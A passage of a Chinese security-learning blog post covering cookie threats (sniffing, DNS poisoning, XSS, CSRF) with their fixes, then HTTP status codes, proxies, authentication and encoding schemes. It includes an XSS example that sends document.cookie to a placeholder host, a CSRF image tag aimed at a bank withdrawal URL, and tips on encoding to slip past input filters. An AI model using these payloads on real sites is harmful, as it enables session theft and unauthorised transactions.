+        <h3 id="1-网络窃听"   >
+          <a href="#1-网络窃听" class="heading-link"><i class="fas fa-link"></i></a>1.网络窃听</h3>
+      <p>网络上的流量可以被网络上任何计算机拦截，特别是未加密的开放式WIFI.这种流量包含在普通的未加密的HTTP请求上发送Cookie.在未加密的情况下，攻击者可以读取网络上的其他用户的信息，包含HTTP Cookie的全部内容，以便进行中间的攻击。比如：拦截cookie来冒充用户身份执行恶意任务(银行转账等)。<br>解决办法：服务器可以设置secure属性的cookie,这样就只能通过https的方式来发送cookies 了。</p>
+
+        <h3 id="2-DNS缓存中毒"   >
+          <a href="#2-DNS缓存中毒" class="heading-link"><i class="fas fa-link"></i></a>2.DNS缓存中毒</h3>
+      <p>如果攻击者可以使DNS缓存中毒，那么攻击者就可以访问用户的Cookie了，例如:攻击者使用DNS中毒来创建个<br>虚拟的NDS服务h123456.<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.demo.com指向攻击者服务器的ip地址.然后攻击者可以从服务器h123456.www.demo.com/img01.png%E5%8F%91%E5%B8%83%E5%9B%BE%E7%89%87%E3%80%82%E7%94%A8%E6%88%B7%E8%AE%BF%E9%97%AE%E8%BF%99%E4%B8%AA%E5%9B%BE%E7%89%87%EF%BC%8C%E7%94%B1%E4%BA%8Ewww.demo.com%E5%92%8Ch123456.www.demo.com%E5%90%8C%E4%B8%80%E4%B8%AA%E5%AD%90%E5%9F%9F%EF%BC%8C%E6%89%80%E4%BB%A5%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BC%9A%E6%8A%8A%E7%94%A8%E6%88%B7%E7%9A%84%E4%B8%8Ewww.demo.com%E7%9B%B8%E5%85%B3%E7%9A%84cookie%E9%83%BD%E4%BC%9A%E5%8F%91%E9%80%81%E5%88%B0h123456.www.demo.com%E8%BF%99%E4%B8%AA%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%EF%BC%8C%E8%BF%99%E6%A0%B7%E6%94%BB%E5%87%BB%E8%80%85%E5%B0%B1%E4%BC%9A%E6%8B%BF%E5%88%B0%E7%94%A8%E6%88%B7%E7%9A%84cookie%E6%90%9E%E4%BA%8B%E6%83%85%E3%80%82" >www.demo.com指向攻击者服务器的ip地址。然后攻击者可以从服务器h123456.www.demo.com/img01.png发布图片。用户访问这个图片，由于www.demo.com和h123456.www.demo.com同一个子域，所以浏览器会把用户的与www.demo.com相关的cookie都会发送到h123456.www.demo.com这个服务器上，这样攻击者就会拿到用户的cookie搞事情。</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>一般情况下是不会 发生这种情况，通常是网络供应商错误。</p>
+
+        <h3 id="3-跨站点脚本XSS"   >
+          <a href="#3-跨站点脚本XSS" class="heading-link"><i class="fas fa-link"></i></a>3.跨站点脚本XSS</h3>
+      <p>使用跨站点脚本技术可以窃取cookie.当网站允许使用javascript操作cookie的时候，就会发生攻击者发布恶意代<br>码攻击用户的会话，同时可以拿到用户的cookie信息。</p>
+<p>例如：</p>
+<p>&lt;a href= “#”onclick= window. location=<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://abc/" >http://abc</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>. com?cookie=$｛docuemnt. cookie｝&gt;领取红包<a></p>
+<p>当用户点击这个链接的时候，浏览器就会执行ondlick里面的代码，结果这个网站用户的cookie信息就会被发送到攻击者的服务器。攻击者同样可以拿cookie搞事情。</p>
+<p>解决办法:可以通过cookie的HttpOnly属性，设置了HttpOnly属性, javascipt代码将不能操作cookie。</p>
+
+        <h3 id="4-跨站请求伪造CSRF"   >
+          <a href="#4-跨站请求伪造CSRF" class="heading-link"><i class="fas fa-link"></i></a>4.跨站请求伪造CSRF</h3>
+      <p>例如，SanShao可能正在浏览其他用户XiaoMing发布消息的聊天论坛。假设XiaoMing制作了一个引用ShanShao<br>银行网站的HTML图像元素，例如：</p>
+<p>&lt;img src =”<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www/" >http://www</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>. bank. com/withdraw?user-SanShao&amp;amount99999&amp;for=XiaoMing”&gt;</p>
+<p>如果SanShao的银行将其认证信息保存在cookie中，并且cookie尚未过期，(当然是没有其他验证身份的东西)，那么SanShao的浏览器尝试加就该图片将史用他的cookie提交提款表单，从而在未经SanShao批准的情况下授权交易。</p>
+<p>解决办法：增加其他信息的校验(手机验证码，或者其他盾牌)</p>
+
+        <h1 id="状态码"   >
+          <a href="#状态码" class="heading-link"><i class="fas fa-link"></i></a>状态码</h1>
+      <p>每条HTTP响应消息都必须在第一行中包含一个状态码，说明请求的结果。根据代码的第一位数字，可将状态码分为以下5类。<br>1xx: 提供信息。<br>2xx: 请求被成功提交。<br>3xx: 客户端被重定向到其他资源。<br>4xx: 请求包含某种错误。<br>5xx: 服务器执行请求时遇到错误。</p>
+<p>还有大量特殊状态码，其中许多状态码仅用在特殊情况下。下面列出渗透测试员在攻击Web应用程序时最有可能遇到的状态码及其相关的原因短语。<br>100 Continue。当客户端提交一个包含主体的请求时，将发送这个响应。该响应表示已收到请求消息头，客户端应继续发送主体。请求完成后，再由服务器返回另一个响应。<br>200 0K：本状态码表示已成功提交请求，且响应主体中包含请求结果。<br>201 Created，PUT 请求的响应返回这个状态码，表示请求已成功提交。<br>301 Moved Permanently：本状态码将浏览器永久重定向到另外一个在Location消息头中指定的URL，以后客户端应使用新URL替换原始URL.。<br>302 Found: 本状态码将浏览器暂时重定向到另外一个在Location消息头中指定的URL.客户端应在随后的请求中恢复使用原始URL。<br>304 Not Modified: 本状态码指示浏览器使用缓存中保存的所请求资源的副本。服务器使用If-Modified-Since与If-None-Match消息头确定客户端是否拥有最新版本的资源。<br>400 Bad Request: 本状态码表示客户端提交了一个无效的HTTP请求。当以某种无效的方式修改请求时(例如在 URL中插入一个空格符)，可能会遇到这个状态码。<br>401 Unauthorized: 服务器在许可请求前要求HTTP进行身份验证。WWW -Authenticate消息头详细说明所支持的身份验证类型。<br>403 Forbidden: 本状态码指出，不管是否通过身份验证，禁止任何人访问被请求的资源。404 Not Found: 本状态码表示所请求的资源并不存在。<br>405 Method Not Allomed: 本状态码表示指定的URL不支持请求中使用的方法。例如，如果试图在不支持PUT方法的地方使用该方法，就会收到本状态码。。<br>413 Request Entity Too Large: 如果在本地代码中探查缓冲器滋出瀚洞并就此提交超长数据串，则本状态码表示请求主体过长，服务器无法处理。。<br>414 Request URL Too Long: 与前一个响应类似，本状态码表示请求中的URL过长，服务器无法处理。<br>500 Internal Server Error: 本状态码表示服务器在执行请求时遇到错误。当提交无法预料的<br>输入、在应用程序处理过程中造成无法处理的错误时，通常会收到本状态码。应该仔细检查服务器响应的所有内容，了解与错误性质有关的详情。<br>503 Service Unavailable: 通常，本状态码表示尽管Web服务器运转正常并且能够响应请求，但服务器访问的应用程序还是无法作出响应。应该进行核实，是否因为执行了某种行为而造成这个结果。</p>
+
+        <h1 id="HTTP代理"   >
+          <a href="#HTTP代理" class="heading-link"><i class="fas fa-link"></i></a>HTTP代理</h1>
+      <p>HTTP代理服务器是一个协调客户端浏览器 与目标Web服务器之间访问的服务器。当配置浏览器使用代理服务器时，它会将所有请求提交到代理服务器，代理服务器再将请求转送给相关Web服务器，并将响应返回给浏览器。大多数代理还使用其他服务，如缓存、验证与访问控制。</p>
+<p>值得注意的是，如果使用代理服务器，HTTP 的工作机制会出现两方面的差异。</p>
+<p>当浏览器向代理服务器发布HTTP请求时，它会将完整的URL(包括协议前缀http://与 服务器主机名称，在非标准URL中，还包括端口号)插人请求中。代理服务器将提取主机名称和端口，并使用这些信息将请求指向正确的目标Web服务器。<br>当使用HTTPS时浏览器无法与代理服务器进行SSL 握手因为这样做会破坏安全隧道，使通信易于遭受拦截攻击。因此，浏览器必须将代理作为一个纯悴的TCP级中继，由它传递浏览器与目标Web浏览器之间的所有网络据，并与浏览器进行正常的SSL握手。浏览器使用CONNECT方法向代理服务器提交一个 HTTP请求，并指定URL中的目标主机名称与端口号，从而建立这种中继。如果代理允许该请求，它会返回一个含200状态码的HTTP响应，一直开放TCP连接，从此以后作为目标Web服务器的纯粹TCP级中继。</p>
+<p>从某种程度上说，攻击Web应用程序时最有用的工具是一个处在浏览器与目标Web站点之间的专用代理服务器，使用它可以拦截并修改所有使用HTTPS的请求与响应。</p>
+
+        <h1 id="HTTP身份验证"   >
+          <a href="#HTTP身份验证" class="heading-link"><i class="fas fa-link"></i></a>HTTP身份验证</h1>
+      <p>HTTP拥有自己的用户身份验证机制，使用不同的身份验证方案。</p>
+<p>Basic 这是种非常商单的身份验证机制。它在请求清息头中随每条消息以Base64编码字符串的形式发送用户证书。</p>
+<p>NTLM WindowsNT 挑战/响应验证机制,称之为NTLM。现在已经有了更新的NTLMv2以及Kerberos 验证体系。NTLM是windows早期安全协议，因向后兼容性而保留下来。</p>
+<p>Digest 这是一种响应式机制，它随同用户证书一起使用一个随机值MD5校验和。</p>
+<p>虽然组织内部经常使用这些身份验证协议访问内联网服务，但因特网上的Web应用程序基本很少使用它们。</p>
+
+        <h1 id="编码方案"   >
+          <a href="#编码方案" class="heading-link"><i class="fas fa-link"></i></a>编码方案</h1>
+      <p>Web应用程序对其数据采用几种不同的编码方案。在早期阶段，HTTP 协议和HTML语言都是基于文本的，于是人们设计出不同的编码方案，确保这些机制能够安全处理不常见的字符和二进制数据。攻击Web应用程序通常需要使用相关方案对数据进行编码，确保应用程序按照想要的方式对其进行处理。而且，在许多情况下，攻击者甚至能够控制应用程序所使用的编码方案，造成其设计人员无法预料的行为。</p>
+
+        <h3 id="1-URL编码"   >
+          <a href="#1-URL编码" class="heading-link"><i class="fas fa-link"></i></a>1.URL编码</h3>
+      <p>URL只允许使用US-ASCII字符集中的可打印字符(也就是ASCII代码在0x20一0x7e范围内的字符)。而且，由于URL方案或HTTP协议内具有特殊含义,这个范围内的一些字符也不能用在URL中。</p>
+<p>URL编码方案主要用于对扩展ASCII字符集中的任何有问题的字符进行编码，使其可通过HTTP 安全传输。任何URL编码的字符都以%为前缀，其后是这个字符的两位十六进制ASCII代码。以下是一些常见的URL编码字符:</p>
+<p>%3d：代表=;<br>%25：代表%;<br>%20：代表空格；</p>
+<p>%0a：代表换行;<br>%00：代表空字节。<br>另一个值得注意的编码字符是加号(+).它代表URL编码的空格(除%20。代表空格外))</p>
+
+        <h3 id="2-Unicode编码"   >
+          <a href="#2-Unicode编码" class="heading-link"><i class="fas fa-link"></i></a>2.Unicode编码</h3>
+      <p>Unicode是一种为支持全世界所使用的各种编写系统而设计的字符编码标准，它采用各种编码方案.其中一些可用于表示Web应用程序中的不常见字符。</p>
+<p>16位Unicode编码的工作原理与URL编码类似。为通过HTTP进行传输，16位Unicode编码的字符以u为前缀，其后是这个字符的十六进制Unicode码点。例如:<br>%u2215：代表 / ；<br>%u00e9：代表；</p>
+<p>UTF-8是一种长度可变的编码标准。它使用一个或几个字节表示每个字符。为通过HTTP进行传输，UTF-8编码的多字节字符以毛为前缀，其后用十六进制表示每个字节。例如:<br>%c2%a9：代表（一个圆圈里面有c）；<br>%e2%89%a0：代表（不等于号）；</p>
+<p>攻击Web应用程序时之所以要用到Unicode编码，主要在于有时可用它来破坏输入确认机制。如果输入过滤阻止了某些恶意表达式，但随后处理输入的组件识别Unicode编码，就可以使用各种标准与畸形Unicode编码避开过滤。</p>
+
+        <h3 id="3-HTML编码"   >
+          <a href="#3-HTML编码" class="heading-link"><i class="fas fa-link"></i></a>3.HTML编码</h3>
+      <p>HTML编码是一种用于表示问题字符以将其安全并入HTML文档的方案。有许多字符具有特殊的含义(如HTML内的元字符)，并被用于定义文档结构而非其内容。为了安全使用这些字符并将其用在文档内容中，就必须对其进行HTML编码。</p>
+<p>HTML编码定义了大量HTML实体来表示特殊的字面量字符.例如:<br>&amp;quot：代表 ”；<br>&amp;apos：代表 ’；<br>&amp;amp：代表 &amp; ；<br>&amp;lt：代表 &lt; ；<br>&amp;g:：代表 &gt; ；</p>
+<p>此外，任何字符都可以使用它的十进制ASCII码进行HTML编码，例如:<br>&amp;#34：代表 ” ；<br>#39：代表 ’ ；</p>
+<p>或者使用十六进制的ASCII码(以x为前缀)，例如:<br>&amp;#x22：代表 ”；<br>&amp;#x27：代表 ’ ；</p>
+<p>当攻击Weh应用程序时，HTML编码主要在探查跨站脚本漏洞时发挥作用。如果应用程序在响应中返回未被修改的用户输入，那么它可能易于受到攻击。但是，如果它对危险字符进行HTML编码，也许比较安全。</p>
+
+        <h3 id="4-Base64编码"   >
+          <a href="#4-Base64编码" class="heading-link"><i class="fas fa-link"></i></a>4.Base64编码</h3>
+      <p>Base64编码仅用个可打印的 ASCII字符就可安全转换任何二进制数据，它常用于对电子邮件附件进行编码，使其通过SMTP安全传输。它还可用于在基本HTTP验证机制中对用户证书进行编码。</p>
+<p>Base64编码将输入数据转换成3个字节块。每个块被划分为4段，每段6个数据位。这6个数据位有64种不同的排列组合，因此每个段可使用一组64个字符表示。Base64编码使用以下字符集，其中只包含可打印的ASCII字符:<br>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopgrstuvwxyz0123456789-/。</p>
+<p>如果最后的输入数据块不能构成3段输出数据，就用一个或两个等号(=)补足输出。<br>例如，The Web Application Hacker’ s Hand book 的Base64编码为:<br>VGh1IFd1YiBBcHBsaWNhdG1vbiBIYWNrZXIncyBIYW5kYm9vaw==</p>
+<p>许多Web应用程序利用Base64编码在cookie与其他参数中传送二进制数据，甚至用它打乱敏感数据以防止即使是细微的修改。应该总是留意并解码发送到客户端的任何Base64数据。由于这些数据使用特殊的字符集，而且有时会在字符串末尾添加补足字符(=)，因此可以轻易辨别出Base64编码的字符串。</p>
+
+        <h3 id="5-十六进制编码"   >
+          <a href="#5-十六进制编码" class="heading-link"><i class="fas fa-link"></i></a>5.十六进制编码</h3>
+      <p>许多应用程序在传送二进制数据时直接使用十六进制编码，用ASCII字符表示十六进制数据块。例如，对cookie中的用户名daf进行十六进制编码，会得到以下结果：<br>646166</p>
+<p>和Base64编码的数据一样，十六进制编码的数据通常也很容易辨认。为了解十六进制编码的功能应当对服务器发送到客户端的任何十六进制数据进行解码。</p>
+
+        <h3 id="6-远程和序列化框架"   >
+          <a href="#6-远程和序列化框架" class="heading-link"><i class="fas fa-link"></i></a>6.远程和序列化框架</h3>
+      <p>近些年出现了各种用于创建用户界面的框架，这些框架中的客户端代码可以远程访问服务器端实施的编程API，利用这些框架，开发者可以在一定程度上忽略Web应用程序的分布式本质，而以与开发传统桌面应用程序类似的方式编写代码。这些框架通常提供客户端上使用的存根API，它们还能够自动处理以下两个任务：通过这些API远程调用相关服务器端功能，对传送给上述功能的任何数据进行序列化。</p>
+<p>这类远程和序列化框架包括:<br>Flex和AMF:<br>Silverlight 和WCF;<br>Java序列化对象<br>ThinkPHP.<br>Struts2</p>
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="https://sculptor-liu.github.io">Sculptor</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="https://sculptor-liu.github.io/2020/07/02/Web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/">https://sculptor-liu.github.io/2020/07/02/Web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-cn" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="https://sculptor-liu.github.io/tags/Web/">Web</a></span></div><div class="post-share"><div class="social-share" data-sites="qzone, qq, weibo, wechat, douban, linkedin, facebook, twitter, google">Share to: </div></div><div class="post-reward reward"><div class="reward-button">请我喝杯咖啡~</div><div class="reward-qrcode"><span class="reward-qrcode-alipay"><img class="reward-qrcode-alipay__img" src="/images/ali_pay.png"><div class="reward-qrcode-alipay__text">支付宝打赏</div></span><span class="reward-qrcode-wechat"><img class="reward-qrcode-wechat__img" src="/images/wechat_pay.png"><div class="reward-qrcode-wechat__text">微信打赏</div></span></div></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2020/07/04/MSF/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">MSF框架</span></a></div></nav></footer></div></div><div class="comments" id="comments"><div id="gitalk-container"></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HTTP%E8%AF%B7%E6%B1%82"><span class="toc-number">1.</span> <span class="toc-text">
+          HTTP请求</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HTTP%E5%93%8D%E5%BA%94"><span class="toc-number">2.</span> <span class="toc-text">
+          HTTP响应</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HTTP%E6%96%B9%E6%B3%95"><span class="toc-number">3.</span> <span class="toc-text">
+          HTTP方法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-GET"><span class="toc-number">3.1.</span> <span class="toc-text">
+          1.GET</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-POST"><span class="toc-number">3.2.</span> <span class="toc-text">
+          2.POST</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-HEAD"><span class="toc-number">3.3.</span> <span class="toc-text">
+          3.HEAD</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-PUT"><span class="toc-number">3.4.</span> <span class="toc-text">
+          4.PUT</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-TRACE"><span class="toc-number">3.5.</span> <span class="toc-text">
+          5.TRACE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-OPTIONS"><span class="toc-number">3.6.</span> <span class="toc-text">
+          6.OPTIONS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-DELETE"><span class="toc-number">3.7.</span> <span class="toc-text">
+          7.DELETE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-CONNECT"><span class="toc-number">3.8.</span> <span class="toc-text">
+          8.CONNECT</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-PATCH"><span class="toc-number">3.9.</span> <span class="toc-text">
+          9.PATCH</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10-GET%E5%92%8CPOST%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">3.10.</span> <span class="toc-text">
+          10.GET和POST的区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11-%E6%89%A9%E5%B1%95%E6%96%B9%E6%B3%95"><span class="toc-number">3.11.</span> <span class="toc-text">
+          11.扩展方法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Cookie"><span class="toc-number">4.</span> <span class="toc-text">
+          Cookie</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-cookie%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">4.1.</span> <span class="toc-text">
+          1.cookie是什么</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-cookie%E5%88%A9%E7%94%A8"><span class="toc-number">4.2.</span> <span class="toc-text">
+          2.cookie利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-cookie%E7%9A%84%E7%B1%BB%E5%9E%8B"><span class="toc-number">4.3.</span> <span class="toc-text">
+          3.cookie的类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-cookie%E7%9A%84%E5%B1%9E%E6%80%A7"><span class="toc-number">4.4.</span> <span class="toc-text">
+          4.cookie的属性</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#cookie%E5%9F%9F"><span class="toc-number">4.4.1.</span> <span class="toc-text">
+          cookie域</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cookie%E7%9A%84%E8%B7%AF%E5%BE%84path"><span class="toc-number">4.4.2.</span> <span class="toc-text">
+          cookie的路径path</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#secure"><span class="toc-number">4.4.3.</span> <span class="toc-text">
+          secure</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%93%8D%E4%BD%9CCookie"><span class="toc-number">5.</span> <span class="toc-text">
+          操作Cookie</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%96%B9cookie"><span class="toc-number">6.</span> <span class="toc-text">
+          第三方cookie</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%89%E5%85%A8"><span class="toc-number">7.</span> <span class="toc-text">
+          安全</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%BD%91%E7%BB%9C%E7%AA%83%E5%90%AC"><span class="toc-number">7.0.1.</span> <span class="toc-text">
+          1.网络窃听</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-DNS%E7%BC%93%E5%AD%98%E4%B8%AD%E6%AF%92"><span class="toc-number">7.0.2.</span> <span class="toc-text">
+          2.DNS缓存中毒</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%B7%A8%E7%AB%99%E7%82%B9%E8%84%9A%E6%9C%ACXSS"><span class="toc-number">7.0.3.</span> <span class="toc-text">
+          3.跨站点脚本XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0CSRF"><span class="toc-number">7.0.4.</span> <span class="toc-text">
+          4.跨站请求伪造CSRF</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8A%B6%E6%80%81%E7%A0%81"><span class="toc-number">8.</span> <span class="toc-text">
+          状态码</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HTTP%E4%BB%A3%E7%90%86"><span class="toc-number">9.</span> <span class="toc-text">
+          HTTP代理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HTTP%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81"><span class="toc-number">10.</span> <span class="toc-text">
+          HTTP身份验证</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E6%96%B9%E6%A1%88"><span class="toc-number">11.</span> <span class="toc-text">
+          编码方案</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-URL%E7%BC%96%E7%A0%81"><span class="toc-number">11.0.1.</span> <span class="toc-text">
+          1.URL编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Unicode%E7%BC%96%E7%A0%81"><span class="toc-number">11.0.2.</span> <span class="toc-text">
+          2.Unicode编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-HTML%E7%BC%96%E7%A0%81"><span class="toc-number">11.0.3.</span> <span class="toc-text">
+          3.HTML编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-Base64%E7%BC%96%E7%A0%81"><span class="toc-number">11.0.4.</span> <span class="toc-text">
+          4.Base64编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E7%BC%96%E7%A0%81"><span class="toc-number">11.0.5.</span> <span class="toc-text">
+          5.十六进制编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E8%BF%9C%E7%A8%8B%E5%92%8C%E5%BA%8F%E5%88%97%E5%8C%96%E6%A1%86%E6%9E%B6"><span class="toc-number">11.0.6.</span> <span class="toc-text">
+          6.远程和序列化框架</span></a></li></ol></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/logo.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">Sculptor</p></div><div class="sidebar-ov-social"><a class="sidebar-ov-social-item" href="https://github.com/Sculptor-liu/" target="_blank" rel="noopener" data-popover="Github" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-github"></i></span></a><a class="sidebar-ov-social-item" href="https://blog.csdn.net/weixin_45798017" target="_blank" rel="noopener" data-popover="social.csdn" data-popover-pos="up"><span class="sidebar-ov-social-item__icon">csdn</span></a></div><div class="sidebar-ov-feed"><span class="sidebar-ov-feed-email"><a class="sidebar-ov-feed-email__link" href="https://mail.qq.com/" target="_blank" rel="noopener"><span class="sidebar-ov-feed-email__icon"><i class="fas fa-envelope"></i></span><span>Email 订阅</span></a></span></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">9</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">3</div><div class="sidebar-ov-state-item__name">分类</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">8</div><div class="sidebar-ov-state-item__name">标签</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-cn" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2020</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>Sculptor</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v5.1.1</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.1.1</span></div><div class="busuanzi"><span class="busuanzi-siteuv"><span class="busuanzi-siteuv__icon"><i class="fas fa-user"></i></span><span class="busuanzi-siteuv__info">访问人数</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_uv"></span></span><span class="busuanzi-sitepv"><span class="busuanzi-siteuv__icon"><i class="fas fa-eye"></i></span><span class="busuanzi-siteuv__info">浏览总量</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_pv"></span></span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="搜索文章（支持多关键词，请用空格分隔）"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script><script>function initSearch() {
+  var isXML = true;
+  var search_path = 'search.xml';
+
+  if (!search_path) {
+    search_path = 'search.xml';
+  } else if (/json$/i.test(search_path)) {
+    isXML = false;
+  }
+
+  var path = '/' + search_path;
+  $.ajax({
+    url: path,
+    dataType: isXML ? 'xml' : 'json',
+    async: true,
+    success: function (res) {
+      var datas = isXML ? $('entry', res).map(function () {
+        // 将 XML 转为 JSON
+        return {
+          title: $('title', this).text(),
+          content: $('content', this).text(),
+          url: $('url', this).text()
+        };
+      }).get() : res;
+      var $input = $('.search-input input');
+      var $result = $('.search-results');
+      // 搜索对象（标题、内容）的权重，影响显示顺序
+      var WEIGHT = { title: 100, content: 1 };
+      var searchPost = function () {
+        var searchText = $input.val().toLowerCase().trim();
+        // 根据空白字符分隔关键字
+        var keywords = searchText.split(/[\s]+/);
+        // 搜索结果
+        var matchPosts = [];
+
+        // 有多个关键字时，将原文字整个保存下来
+        if (keywords.length > 1) {
+          keywords.push(searchText);
+        }
+        // 防止未输入字符时搜索
+        if (searchText.length > 0) {
+          datas.forEach(function (data) {
+            var isMatch  = false;
+            // 没有标题的文章使用预设的 i18n 变量代替
+            var title = (data.title && data.title.trim()) || '[ 文章无标题 ]';
+            var titleLower = title && title.toLowerCase();
+            // 删除 HTML 标签 和 所有空白字符
+            var content = data.content && data.content.replace(/<[^>]+>/g, '');
+            var contentLower = content && content.toLowerCase();
+            // 删除重复的 /
+            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
+            // 标题中匹配到的关键词
+            var titleHitSlice = [];
+            // 内容中匹配到的关键词
+            var contentHitSlice = [];
+
+            keywords.forEach(function (keyword) {
+              /**
+              * 获取匹配的关键词的索引
+              * @param {String} keyword 要匹配的关键字
+              * @param {String} text 原文字
+              * @param {Boolean} caseSensitive 是否区分大小写
+              * @param {Number} weight 匹配对象的权重。权重大的优先显示
+              * @return {Array}
+              */
